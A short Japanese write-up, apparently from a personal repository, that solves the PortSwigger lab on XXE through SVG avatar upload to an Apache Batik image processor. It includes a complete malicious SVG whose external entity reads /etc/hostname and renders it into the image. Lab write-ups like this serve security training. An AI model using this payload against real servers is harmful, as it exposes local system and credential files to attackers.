# 画像ファイルのアップロードによる XXE の悪用

このラボでは、ユーザーがコメントにアバターを添付し、Apache Batik ライブラリを使用してアバター画像ファイルを処理できるようになっています。  
https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload

- 1. 以下の svg ファイルを作成します

```svg
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

- 2. ブログのコメント欄で上記画像をアップロードしてコメントします

- 3. コメント一覧を確認すると、画像に hostname が格納されています
     ![1](https://github.com/pea-sys/web-security-experiments/assets/49807271/5ff5ff63-9e2b-4393-82e4-2835e80362d2)
     ※小さすぎて見えない場合は、画面拡大したり画像のみ表示
